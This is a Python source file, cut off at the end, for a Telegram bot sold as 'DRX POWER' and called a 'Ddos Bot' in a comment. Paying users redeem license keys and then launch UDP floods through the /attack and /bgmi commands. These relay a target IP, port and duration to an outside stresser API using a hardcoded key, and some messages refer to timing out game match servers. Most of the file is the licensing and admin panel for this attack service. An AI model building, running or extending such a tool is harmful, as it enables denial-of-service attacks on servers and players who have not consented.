import telebot
import json
import requests
import datetime
import os
import time
import psutil # - Asali System Load ke liye
import socket
import threading
from zoneinfo import ZoneInfo

# - Load Config (Admin ID aur Token)
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    exit()

bot = telebot.TeleBot(config['token'])
# Agar API isi VPS par hai toh '127.0.0.1' use karein, varna VPS ka IP dalein
#API_URL = "http://127.0.0.1:8080/hit"
#API_URL = "https://retrostress.net/api/start"
API_URL = "https://bgmibotv2.onrender.com/hit"
AUTH_TOKEN = "DRX_POWER_ULTRA_V4"
KEY_API= "6378cea5c08195f4c92db7b8fe80966daa91cc20f5eb3fda160a815d86c9f348"

# Database files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
admin_states = {}
SUBADMINS_FILE = "subadmins.json"
admin_manager_states = {}

def load_data(file):
    if not os.path.exists(file):
        return {}

    try:
        with open(file, "r") as f:
            content = f.read().strip()

            if not content:
                return {}

            return json.loads(content)

    except json.JSONDecodeError:
        return {}

    except Exception:
        return {}

def save_data(file, data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def has_permission(user_id, permission):

    # Main Admin always has access
    if str(user_id) == config["admin"]:
        return True

    subadmins = load_data(SUBADMINS_FILE)

    if str(user_id) not in subadmins:
        return False

    permissions = subadmins[str(user_id)].get("permissions", [])

    return permission in permissions


IST = ZoneInfo("Asia/Kolkata")

def check_user_expiry():

    users = load_data(USERS_FILE)
    userskey = load_data(KEYS_FILE)

    changed = False

    now = datetime.now(IST)

    for user_id, user in users.items():

        if not user.get("active", False):
            continue

        expiry = user.get("expires_at")

        if not expiry:
            continue

        try:

            expiry_time = datetime.strptime(
                expiry.replace(" IST", ""),
                "%Y-%m-%d %H:%M:%S"
            ).replace(tzinfo=IST)

            if now >= expiry_time:

                user["active"] = False
                users[user_id] = user
                changed = True

        except:
            continue

    if changed:
        save_data(USERS_FILE, users)
        save_data(KEYS_FILE, userskey)

def expiry_checker():

    while True:

        try:
            check_user_expiry()
        except Exception as e:
            print("Expiry Checker:", e)

        time.sleep(10)
def is_active_user(user_id):

    users = load_data(USERS_FILE)

    user = users.get(str(user_id))

    if not user:
        return False

    if not user.get("active", False):
        return False

    expiry = user.get("expires_at")

    if expiry:

        try:

            expiry_time = datetime.strptime(
                expiry.replace(" IST", ""),
                "%Y-%m-%d %H:%M:%S"
            ).replace(tzinfo=IST)

            if datetime.now(IST) >= expiry_time:

                user["active"] = False
                users[str(user_id)] = user
                save_data(USERS_FILE, users)

                return False

        except:
            return False

    return True

# - Commands Logic
'''
 @bot.message_handler(commands=['start'])
#def welcome(m):
   #bot.reply_to(m, "🔥 **DRX POWER Bot Active**\n\nWelcome! Use /help to see command list.")
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Swagofficialowner"
    bot.reply_to(message, response)
'''
@bot.message_handler(commands=['start'])
def welcome_start(message):
    users = load_data(USERS_FILE)
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name

    if user_id in users and users[user_id].get("active"):
        access = "🟢 Active"
        plan = users[user_id].get("plan", "Premium")
    else:
        access = "🔴 No Active Plan"
        plan = "None"

    response = f"""
🚀 <b>DRX POWER CONTROL PANEL</b>
━━━━━━━━━━━━━━━━━━

👋 <b>Welcome, {user_name}!</b>

👤 <b>User ID:</b> <code>{user_id}</code>
💎 <b>Plan:</b> {plan}
🔐 <b>Access:</b> {access}

📋 <b>Available Commands</b>
• <code>/help</code> — View command list
• <code>/status</code> — Check bot status
• <code>/redeem</code> — Activate your plan

⚡ <b>System:</b> Online 🟢
🛡️ <b>Protection:</b> Active
🚀 <b>Infrastructure:</b> DRX POWER

━━━━━━━━━━━━━━━━━━
Thank you for choosing <b>DRX POWER</b>.
"""

    bot.reply_to(message, response, parse_mode="HTML")
'''    
@bot.message_handler(commands=['help'])
def help_cmd(m):
    help_text = """
🚀 **Available Commands:**
/bgmi <ip> <port> <time> - Start Attack - Method BGMI
/attack <ip> <port> <time> - Start Attack - Method UDP-BIG
/redeem <key> - Activate Plan
/myinfo - Check your Plan
/status - Current Attack Status

👑 **Admin Only:**
/genkey <duration> - Generate Key (e.g., /genkey 1d)
    """
    bot.reply_to(m, help_text)
'''
@bot.message_handler(commands=['help'])
def help_cmd(m):
    user_id = str(m.from_user.id)

    help_text = """
📚 <b>DRX POWER - Command Center</b>
━━━━━━━━━━━━━━━━━━

⚡ <b>User Commands</b>

🚀 <code>/bgmi &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>
Start an attack.[Method- BGMI]

🚀 <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>
Start an attack.[Method- UDP-BIG]

🎟️ <code>/redeem &lt;key&gt;</code>
Activate your subscription.

👤 <code>/myinfo</code>
View your account details.

📊 <code>/status</code>
Check bot & API status.
"""

    # Show admin commands only to admins
    if user_id in config["admin"]:
        help_text += """

━━━━━━━━━━━━━━━━━━
👑 <b>Administrator Commands</b>

🔑 <code>/genkey &lt;duration&gt;</code>
Generate a new activation key.
🔑 <code>/keymanage &lt;duration&gt;</code>
Manage Generated keys.

<b>Examples:</b>
• <code>/genkey 1h</code> — 1 Hour
• <code>/genkey 1d</code> — 1 Day
• <code>/genkey 1w</code> — 1 Week
• <code>/genkey 1m</code> — 1 Month

🛠️ <i>Administrator privileges detected.</i>
"""

    help_text += """

━━━━━━━━━━━━━━━━━━
💎 <b>DRX POWER</b>
⚡ High-Speed • 🛡️ Secure • 🚀 Reliable
"""

    bot.reply_to(m, help_text, parse_mode="HTML")
'''
@bot.message_handler(commands=['genkey'])
def genkey(m):
    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")
    
    args = m.text.split()
    if len(args) < 2: return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
    
    duration = args[1]
    key = "DM-" + os.urandom(3).hex().upper()
    
    keys = load_data(KEYS_FILE)
    keys[key] = duration
    save_data(KEYS_FILE, keys)
    
    bot.reply_to(m, f"🔑 **Key Generated:** `{key}`\n⏳ **Duration:** {duration}")
'''
from datetime import datetime, timedelta
from zoneinfo import ZoneInfo

@bot.message_handler(commands=['genkey'])
def genkey(m):
    user_id = str(m.from_user.id)

    # Admin check
    # Permission check
    if not has_permission(user_id, "genkey"):
        return bot.reply_to(
            m,
            "⛔ <b>Access Denied</b>\n\nOnly administrators are authorized to use this command.",
            parse_mode="HTML"
        )

    args = m.text.split()

    if len(args) != 2:
        return bot.reply_to(
            m,
            """⚠️ <b>Invalid Command Usage</b>

<b>Syntax:</b>
<code>/genkey &lt;duration&gt;</code>

<b>Examples:</b>
• <code>/genkey 1h</code> — 1 Hour
• <code>/genkey 1d</code> — 1 Day
• <code>/genkey 1w</code> — 1 Week
• <code>/genkey 1m</code> — 1 Month""",
            parse_mode="HTML"
        )

    duration = args[1].lower()

    # Parse duration
    try:
        value = int(duration[:-1])
        unit = duration[-1]

        if unit == "h":
            delta = timedelta(hours=value)
        elif unit == "d":
            delta = timedelta(days=value)
        elif unit == "w":
            delta = timedelta(weeks=value)
        elif unit == "m":
            delta = timedelta(days=value * 30)
        else:
            raise ValueError
    except:
        return bot.reply_to(
            m,
            "❌ <b>Invalid Duration!</b>\n\nUse only:\n<code>1h</code>, <code>1d</code>, <code>1w</code>, <code>1m</code>",
            parse_mode="HTML"
        )

    key = "DRX-" + os.urandom(3).hex().upper()
    IST = ZoneInfo("Asia/Kolkata")
    created_time = datetime.now(IST)
    expiry_time = created_time + delta

    keys = load_data(KEYS_FILE)

    keys[key] = {
        "duration": duration,
        "created_at": created_time.strftime("%Y-%m-%d %H:%M:%S"),
        "expires_at": expiry_time.strftime("%Y-%m-%d %H:%M:%S"),
        "redeemed": False,
        "redeemed_by": None,
        "redeemed_at": None
    }

    save_data(KEYS_FILE, keys)

    bot.reply_to(
        m,
        f"""🔑 <b>License Key Generated Successfully</b>

━━━━━━━━━━━━━━━━━━

🎟️ <b>Key</b>
<code>{key}</code>

⏳ <b>Duration</b>
<code>{duration}</code>

🕒 <b>Created</b>
<code>{created_time.strftime("%d %b %Y %I:%M:%S %p")}</code>

⌛ <b>Expires</b>
<code>{expiry_time.strftime("%d %b %Y %I:%M:%S %p")}</code>

👤 <b>Generated By</b>
<code>{m.from_user.first_name}</code>

🟢 <b>Status</b>
<code>Ready to Redeem</code>

━━━━━━━━━━━━━━━━━━
💎 <b>DRX POWER Licensing System</b>
""",
        parse_mode="HTML"
    )
'''  
@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()
    if len(args) < 2: return bot.reply_to(m, "Usage: /redeem DM-XXXX")
    
    user_key = args[1]
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        duration = keys[user_key]
        users = load_data(USERS_FILE)
        
        users[str(m.from_user.id)] = {"plan": duration, "active": True}
        save_data(USERS_FILE, users)
        
        del keys[user_key]
        save_data(KEYS_FILE, keys)
        bot.reply_to(m, f"✅ **Redeemed Successfully!**\nPlan: {duration} active.")
    else:
        bot.reply_to(m, "❌ Invalid or Expired Key.")
'''
from datetime import datetime
from zoneinfo import ZoneInfo

IST = ZoneInfo("Asia/Kolkata")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()

    if len(args) != 2:
        return bot.reply_to(
            m,
            """🎟️ <b>License Activation</b>

<b>Usage:</b>
<code>/redeem &lt;license_key&gt;</code>

<b>Example:</b>
<code>/redeem DRX-ABC123</code>""",
            parse_mode="HTML"
        )

    user_id = str(m.from_user.id)
    user_key = args[1].upper()

    keys = load_data(KEYS_FILE)

    if user_key not in keys:
        return bot.reply_to(
            m,
            """❌ <b>Invalid License Key</b>

This license key does not exist.

Please check the key and try again.""",
            parse_mode="HTML"
        )

    key_data = keys[user_key]

    # Already redeemed?
    if key_data.get("redeemed", False):
        return bot.reply_to(
            m,
            """❌ <b>License Already Redeemed</b>

This license key has already been used.""",
            parse_mode="HTML"
        )

    users = load_data(USERS_FILE)

    users[user_id] = {
        "plan": key_data["duration"],
        "active": True,
        "activated_at": datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST"),
        "expires_at": key_data["expires_at"]
    }

    save_data(USERS_FILE, users)

    # Update key info
    key_data["redeemed"] = True
    key_data["redeemed_by"] = user_id
    key_data["redeemed_at"] = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")

    keys[user_key] = key_data
    save_data(KEYS_FILE, keys)

    bot.reply_to(
        m,
        f"""✅ <b>License Activated Successfully</b>

━━━━━━━━━━━━━━━━━━

👤 <b>User</b>
<code>{m.from_user.first_name}</code>

💎 <b>Plan</b>
<code>{key_data['duration']}</code>

🕒 <b>Activated</b>
<code>{datetime.now(IST).strftime("%d %b %Y %I:%M:%S %p IST")}</code>

⌛ <b>Expires</b>
<code>{key_data['expires_at']}</code>

🔐 <b>Status</b>
<code>🟢 Active</code>

━━━━━━━━━━━━━━━━━━
🚀 <b>Welcome to DRX POWER!</b>
""",
        parse_mode="HTML"
    )
'''    
@bot.message_handler(commands=['attack'])
def attack(m):
    # Sahi function name use kiya gaya hai
    users = load_data(USERS_FILE) 
    user_id = str(m.from_user.id)
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(m, "❌ **ACCESS DENIED!**\nNo active plan found. Please use /redeem first.")

    args = m.text.split()
    if len(args) != 4: 
        return bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    try:
        response = requests.get(f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=UDP-BIG", timeout=10)
        data = response.json()
        if data.get("success"):
            
            bot.reply_to(m, f"🚀 **ATTACK STARTED!**\nType: UDP-BIG\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅")
            
            def send_finish():
                bot.send_message(m.chat.id, f"✅ **ATTACK FINISHED**\n🎯 Target: `{ip}:{port}`\nStatus: Match Server Response Timed Out")
            
            threading.Timer(int(attack_time), send_finish).start()
        else:
            bot.reply_to(m, "❌ **API ERROR!**\nServer responded but with an error.")
            
    except Exception as e:
        bot.reply_to(m, "❌ **VPS OFFLINE!**\nCould not connect to API. `python3 api.py` start hai?")
'''
@bot.message_handler(commands=['attack'])
def attack(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)

    # Check user access
    #if user_id not in users or not users[user_id].get("active"):
    if not is_active_user(user_id):
        return bot.reply_to(
            m,
            """⛔ <b>Access Denied</b>

You do not have an active subscription.

🎟️ Activate your plan using:
<code>/redeem &lt;license_key&gt;</code>""",
            parse_mode="HTML"
        )

    args = m.text.split()

    if len(args) != 4:
        return bot.reply_to(
            m,
            """⚠️ <b>Invalid Command Usage</b>

<b>Syntax:</b>
<code>/attack &lt;IP&gt; &lt;PORT&gt; &lt;TIME&gt;</code>

<b>Example:</b>
<code>/attack 1.1.1.1 443 60</code>""",
            parse_mode="HTML"
        )

    ip, port, attack_time = args[1], args[2], args[3]

    try:
        response = requests.get(
            f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=UDP-BIG",
            timeout=10
        )

        data = response.json()

        if data.get("success"):

            msg = bot.reply_to(
                m,
                f"🚀 STARTED!\n"
                f"Type: UDP-BIG\n"
                f"🎯 Target: {ip}:{port}\n"
                f"🕒 Time: {attack_time}s\n"
                f"💎 Power: DRX ULTRA\n"
                f"📶 Status: API CONNECTED ✅"
            )

            total = int(attack_time)
            bar_length = 20

            for elapsed in range(total + 1):

                percent = elapsed / total if total else 1
                filled = int(bar_length * percent)
                bar = "█" * filled + "░" * (bar_length - filled)

                text = (
                    f"🚀 STARTED!\n\n"
                    f"Type: UDP-BIG\n"
                    f"🎯 Target: {ip}:{port}\n"
                    f"🕒 Time: {total}s\n\n"
                    f"⏳ Progress\n"
                    f"`[{bar}]`\n"
                    f"📊 {int(percent * 100)}%\n\n"
                    f"⏱ Elapsed: {elapsed}s\n"
                    f"⌛ Remaining: {total - elapsed}s\n\n"
                    f"💎 Power: DRX ULTRA\n"
                    f"📶 Status: API CONNECTED ✅"
                )

                try:
                    bot.edit_message_text(
                        chat_id=msg.chat.id,
                        message_id=msg.message_id,
                        text=text,
                        parse_mode="Markdown"
                    )
                except:
                    pass

                if elapsed < total:
                    time.sleep(1)

            bot.edit_message_text(
                chat_id=msg.chat.id,
                message_id=msg.message_id,
                text=(
                    f"✅ COMPLETED!\n\n"
                    f"🎯 Target: {ip}:{port}\n"
                    f"🕒 Time: {total}s\n\n"
                    f"`[████████████████████]`\n"
                    f"📊 100%\n\n"
                    f"💎 Power: DRX ULTRA\n"
                    f"📶 Status: FINISHED ✅"
                ),
                parse_mode="Markdown"
            )

            def send_finish():
                bot.send_message(
                    m.chat.id,
                    f"""✅ <b>Operation Completed</b>
━━━━━━━━━━━━━━━━━━

🎯 <b>Target:</b> <code>{ip}:{port}</code>
📊 <b>Status:</b> Completed
🟢 <b>Server Response:</b> Finished

━━━━━━━━━━━━━━━━━━
Thank you for using <b>DRX POWER</b>.""",
                    parse_mode="HTML"
                )

            threading.Timer(total, send_finish).start()

        else:
            bot.reply_to(
                m,
                """❌ <b>API Request Failed</b>

The server received your request but could not process it.

Please try again later.""",
                parse_mode="HTML"
            )

    except Exception as e:
        bot.reply_to(
            m,
            f"""🔴 <b>Connection Error</b>

Unable to connect to the API server.

Error:
<code>{e}</code>""",
            parse_mode="HTML"
        )
'''        
@bot.message_handler(commands=['bgmi'])
def attack(m):
    # Sahi function name use kiya gaya hai
    users = load_data(USERS_FILE) 
    user_id = str(m.from_user.id)
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(m, "❌ **ACCESS DENIED!**\nNo active plan found. Please use /redeem first.")

    args = m.text.split()
    if len(args) != 4: 
        return bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    try:
        response = requests.get(f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=BGMI", timeout=10)
        data = response.json()
        if data.get("success"):
            bot.reply_to(m, f"🚀 **ATTACK STARTED!**\nType: BGMI\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅")
            
            def send_finish():
                bot.send_message(m.chat.id, f"✅ **ATTACK FINISHED**\n🎯 Target: `{ip}:{port}`\nStatus: Match Server Response Timed Out")
            
            threading.Timer(int(attack_time), send_finish).start()
        else:
            bot.reply_to(m, "❌ **API ERROR!**\nServer responded but with an error.")
            
    except Exception as e:
        bot.reply_to(m, "❌ **VPS OFFLINE!**\nCould not connect to API. `python3 api.py` start hai?")
'''
@bot.message_handler(commands=['bgmi'])
def attack(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)

    # Check user access
    if user_id not in users or not users[user_id].get("active"):
        return bot.reply_to(
            m,
            """⛔ <b>Access Denied</b>

You do not have an active subscription.

🎟️ Activate your plan using:
<code>/redeem &lt;license_key&gt;</code>""",
            parse_mode="HTML"
        )

    args = m.text.split()

    if len(args) != 4:
        return bot.reply_to(
            m,
            """⚠️ <b>Invalid Command Usage</b>

<b>Syntax:</b>
<code>/attack &lt;IP&gt; &lt;PORT&gt; &lt;TIME&gt;</code>

<b>Example:</b>
<code>/attack 1.1.1.1 443 60</code>""",
            parse_mode="HTML"
        )

    ip, port, attack_time = args[1], args[2], args[3]

    try:
        response = requests.get(
            f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=BGMI",
            timeout=10
        )

        data = response.json()

        if data.get("success"):

            msg = bot.reply_to(
                m,
                f"🚀 STARTED!\n"
                f"Type: BGMI\n"
                f"🎯 Target: {ip}:{port}\n"
                f"🕒 Time: {attack_time}s\n"
                f"💎 Power: DRX ULTRA\n"
                f"📶 Status: API CONNECTED ✅"
            )

            total = int(attack_time)
            bar_length = 20

            for elapsed in range(total + 1):

                percent = elapsed / total if total else 1
                filled = int(bar_length * percent)
                bar = "█" * filled + "░" * (bar_length - filled)

                text = (
                    f"🚀 STARTED!\n\n"
                    f"Type: BGMI\n"
                    f"🎯 Target: {ip}:{port}\n"
                    f"🕒 Time: {total}s\n\n"
                    f"⏳ Progress\n"
                    f"`[{bar}]`\n"
                    f"📊 {int(percent * 100)}%\n\n"
                    f"⏱ Elapsed: {elapsed}s\n"
                    f"⌛ Remaining: {total - elapsed}s\n\n"
                    f"💎 Power: DRX ULTRA\n"
                    f"📶 Status: API CONNECTED ✅"
                )

                try:
                    bot.edit_message_text(
                        chat_id=msg.chat.id,
                        message_id=msg.message_id,
                        text=text,
                        parse_mode="Markdown"
                    )
                except:
                    pass

                if elapsed < total:
                    time.sleep(1)

            bot.edit_message_text(
                chat_id=msg.chat.id,
                message_id=msg.message_id,
                text=(
                    f"✅ COMPLETED!\n\n"
                    f"🎯 Target: {ip}:{port}\n"
                    f"🕒 Time: {total}s\n\n"
                    f"`[████████████████████]`\n"
                    f"📊 100%\n\n"
                    f"💎 Power: DRX ULTRA\n"
                    f"📶 Status: FINISHED ✅"
                ),
                parse_mode="Markdown"
            )

            def send_finish():
                bot.send_message(
                    m.chat.id,
                    f"""✅ <b>Operation Completed</b>
━━━━━━━━━━━━━━━━━━

🎯 <b>Target:</b> <code>{ip}:{port}</code>
📊 <b>Status:</b> Completed
🟢 <b>Server Response:</b> Finished

━━━━━━━━━━━━━━━━━━
Thank you for using <b>DRX POWER</b>.""",
                    parse_mode="HTML"
                )

            threading.Timer(total, send_finish).start()

        else:
            bot.reply_to(
                m,
                """❌ <b>API Request Failed</b>

The server received your request but could not process it.

Please try again later.""",
                parse_mode="HTML"
            )

    except Exception as e:
        bot.reply_to(
            m,
            f"""🔴 <b>Connection Error</b>

Unable to connect to the API server.

Error:
<code>{e}</code>""",
            parse_mode="HTML"
        )

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)
    user_name = m.from_user.first_name

    if user_id not in users:
        return bot.reply_to(
            m,
            """⚠️ <b>ACCESS DENIED</b>

No active DRX POWER license detected.

🔑 Activate your license using:
<code>/redeem YOUR_KEY</code>""",
            parse_mode="HTML"
        )

    user = users[user_id]

    status = "🟢 ONLINE" if user.get("active", False) else "🔴 OFFLINE"

    bot.reply_to(
        m,
        f"""<pre>
╔════════════════════════════╗
║   ⚡ DRX POWER USER HUD ⚡   ║
╚════════════════════════════╝
</pre>

👤 <b>USER</b>      ▸ <code>{user_name}</code>
🆔 <b>UID</b>       ▸ <code>{user_id}</code>
💎 <b>LICENSE</b>   ▸ <code>{user['plan'].upper()}</code>
🟢 <b>STATUS</b>    ▸ <code>{status}</code>

━━━━━━━━━━━━━━━━━━━━

🕒 <b>ACTIVATED</b> ▸
<code>{user.get('activated_at', 'N/A')}</code>

⌛ <b>EXPIRES</b>   ▸
<code>{user.get('expires_at', 'N/A')}</code>

━━━━━━━━━━━━━━━━━━━━

🛡 <b>SECURITY</b>  ▸ <code>VERIFIED</code>
📡 <b>NETWORK</b>   ▸ <code>CONNECTED</code>
🤖 <b>AI CORE</b>   ▸ <code>DRX POWER v2.0</code>
⚡ <b>NODE</b>      ▸ <code>STABLE</code>

━━━━━━━━━━━━━━━━━━━━

🟢 <b>SESSION VERIFIED</b>
""",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['status'])
def status(m):
    import requests
    import psutil
    import time
    import threading

    def progress_bar(value):
        total = 12
        filled = round(value / 100 * total)
        return "🟩" * filled + "⬜" * (total - filled)

    # API Status
    api_status = "🔴 OFFLINE"
    try:
        response = requests.get(
            f"https://retrostress.net/api/start?key={KEY_API}",
            timeout=5
        )
        data = response.json()

        if data.get("status") == 400:
            api_status = "🟢 ONLINE"
    except:
        pass

    # Send initial message
    msg = bot.reply_to(
        m,
        "⏳ <b>Loading System Status...</b>",
        parse_mode="HTML"
    )

    def update_status():

        for _ in range(10):   # Update for 20 seconds

            cpu = psutil.cpu_percent(interval=0.5)
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent

            cpu_icon = "🟢" if cpu < 50 else "🟡" if cpu < 80 else "🔴"
            ram_icon = "🟢" if ram < 50 else "🟡" if ram < 80 else "🔴"
            disk_icon = "🟢" if disk < 50 else "🟡" if disk < 80 else "🔴"

            text = f"""
<b>⚡ DRX POWER STATUS</b>

🤖 <b>Bot</b> : 🟢 ONLINE
🔌 <b>API</b> : {api_status}

🖥 <b>CPU</b> {cpu_icon}
{progress_bar(cpu)}
<code>{cpu:.1f}%</code>

💾 <b>RAM</b> {ram_icon}
{progress_bar(ram)}
<code>{ram:.1f}%</code>

📀 <b>DISK</b> {disk_icon}
{progress_bar(disk)}
<code>{disk:.1f}%</code>

━━━━━━━━━━━━━━
⚡ <code>DRX POWER v2.0</code>
🛡 <code>System Stable</code>

🔄 <i>Live Refreshing...</i>
"""

            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=msg.chat.id,
                    message_id=msg.message_id,
                    parse_mode="HTML"
                )
            except:
                pass

            time.sleep(1)

        # Final message
        try:
            bot.edit_message_text(
                text=text.replace(
                    "🔄 <i>Live Refreshing...</i>",
                    "✅ <b>Monitoring Finished</b>"
                ),
                chat_id=msg.chat.id,
                message_id=msg.message_id,
                parse_mode="HTML"
            )
        except:
            pass

    threading.Thread(target=update_status).start()
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@bot.message_handler(commands=['keymanage'])
def keymanage(m):
    user_id = str(m.from_user.id)

    # Admin Check
    if user_id not in config["admin"]:
        return bot.reply_to(
            m,
            "⛔ <b>Access Denied</b>\n\nOnly administrators can access DRX Key Manager.",
            parse_mode="HTML"
        )

    keys = load_data(KEYS_FILE)

    total = len(keys)
    available = 0
    redeemed = 0

    for data in keys.values():

        # Supports old + new keys
        if isinstance(data, dict):
            if data.get("redeemed", False):
                redeemed += 1
            else:
                available += 1
        else:
            available += 1

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton("📋 List Keys", callback_data="km_list"),
        InlineKeyboardButton("🗑 Delete Key", callback_data="km_delete")
    )

    markup.add(
        InlineKeyboardButton("🧹 Clean", callback_data="km_clean"),
        InlineKeyboardButton("📊 Stats", callback_data="km_stats")
    )

    markup.add(
        InlineKeyboardButton("❌ Close", callback_data="km_close")
    )

    bot.reply_to(
        m,
        f"""
<b>🔑 DRX POWER • KEY MANAGER</b>

━━━━━━━━━━━━━━━━━━

🔑 <b>Total Keys</b>
<code>{total}</code>

🟢 <b>Available</b>
<code>{available}</code>

🔴 <b>Redeemed</b>
<code>{redeemed}</code>

━━━━━━━━━━━━━━━━━━

Select an option below.
""",
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.callback_query_handler(func=lambda call: call.data == "km_close")
def km_close(call):
    try:
        bot.delete_message(
            call.message.chat.id,
            call.message.message_id
        )
    except:
        pass
KEYS_PER_PAGE = 10

@bot.callback_query_handler(func=lambda call: call.data.startswith("km_list"))
def km_list(call):

    keys = load_data(KEYS_FILE)

    key_list = list(keys.items())

    # Default page
    page = 0

    # callback example: km_list:2
    if ":" in call.data:
        try:
            page = int(call.data.split(":")[1])
        except:
            page = 0

    start = page * KEYS_PER_PAGE
    end = start + KEYS_PER_PAGE

    total_pages = max(1, (len(key_list) + KEYS_PER_PAGE - 1) // KEYS_PER_PAGE)

    text = "🔑 <b>DRX KEY DATABASE</b>\n\n"

    ready = 0
    redeemed = 0

    for key, data in key_list[start:end]:

        if isinstance(data, dict):

            duration = data.get("duration", "N/A")

            if data.get("redeemed", False):
                redeemed += 1
                status = "🔴 USED"
            else:
                ready += 1
                status = "🟢 READY"

        else:

            duration = data
            ready += 1
            status = "🟢 READY"

        text += (
            f"<code>{key}</code>\n"
            f"💎 {duration.upper()} • {status}\n\n"
        )

    text += f"""
━━━━━━━━━━━━━━━━━━

📄 <b>Page</b>
<code>{page+1}/{total_pages}</code>
"""

    markup = InlineKeyboardMarkup(row_width=3)

    buttons = []

    if page > 0:
        buttons.append(
            InlineKeyboardButton(
                "⬅️ Previous",
                callback_data=f"km_list:{page-1}"
            )
        )

    buttons.append(
        InlineKeyboardButton(
            "🏠 Home",
            callback_data="km_home"
        )
    )

    if page < total_pages - 1:
        buttons.append(
            InlineKeyboardButton(
                "➡️ Next",
                callback_data=f"km_list:{page+1}"
            )
        )

    markup.row(*buttons)

    try:
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML",
            reply_markup=markup
        )
    except Exception:
        bot.answer_callback_query(call.id)
@bot.callback_query_handler(func=lambda call: call.data == "km_home")
def km_home(call):

    keys = load_data(KEYS_FILE)

    total = len(keys)
    available = 0
    redeemed = 0

    for data in keys.values():

        if isinstance(data, dict):
            if data.get("redeemed", False):
                redeemed += 1
            else:
                available += 1
        else:
            available += 1

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton("📋 List Keys", callback_data="km_list"),
        InlineKeyboardButton("🔍 Search", callback_data="km_search")
    )

    markup.add(
        InlineKeyboardButton("🧹 Clean", callback_data="km_clean"),
        InlineKeyboardButton("📊 Stats", callback_data="km_stats")
    )

    markup.add(
        InlineKeyboardButton("❌ Close", callback_data="km_close")
    )

    bot.edit_message_text(
        f"""
<b>🔑 DRX POWER • KEY MANAGER</b>

━━━━━━━━━━━━━━━━━━

🔑 <b>Total Keys</b>
<code>{total}</code>

🟢 <b>Available</b>
<code>{available}</code>

🔴 <b>Redeemed</b>
<code>{redeemed}</code>

━━━━━━━━━━━━━━━━━━

Select an option below.
""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
@bot.callback_query_handler(func=lambda call: call.data == "km_stats")
def km_stats(call):

    keys = load_data(KEYS_FILE)

    total = len(keys)

    available = 0
    redeemed = 0

    plans = {
        "1h": 0,
        "1d": 0,
        "1w": 0,
        "1m": 0
    }

    for data in keys.values():

        # Support old + new format
        if isinstance(data, dict):
            duration = data.get("duration", "").lower()

            if data.get("redeemed", False):
                redeemed += 1
            else:
                available += 1

        else:
            duration = str(data).lower()
            available += 1

        if duration in plans:
            plans[duration] += 1

    markup = InlineKeyboardMarkup()

    markup.add(
        InlineKeyboardButton("◀️ Back", callback_data="km_home")
    )

    text = f"""
<b>📊 DRX POWER • DATABASE STATS</b>

━━━━━━━━━━━━━━━━━━

🔑 <b>Total Keys</b>
<code>{total}</code>

🟢 <b>Available</b>
<code>{available}</code>

🔴 <b>Redeemed</b>
<code>{redeemed}</code>

━━━━━━━━━━━━━━━━━━

⏳ <b>1 Hour</b>
<code>{plans['1h']}</code>

📅 <b>1 Day</b>
<code>{plans['1d']}</code>

🗓 <b>1 Week</b>
<code>{plans['1w']}</code>

📆 <b>1 Month</b>
<code>{plans['1m']}</code>

━━━━━━━━━━━━━━━━━━

💾 <b>Database Status</b>

<code>HEALTHY ✅</code>
"""

    try:
        bot.edit_message_text(
            text=text,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=markup
        )
    except:
        bot.answer_callback_query(call.id, "Already up to date.")
@bot.callback_query_handler(func=lambda call: call.data == "km_clean")
def km_clean(call):

    keys = load_data(KEYS_FILE)

    redeemed = sum(
        1 for data in keys.values()
        if isinstance(data, dict) and data.get("redeemed", False)
    )

    markup = InlineKeyboardMarkup(row_width=2)

    markup.add(
        InlineKeyboardButton("✅ Yes, Clean", callback_data="km_clean_yes"),
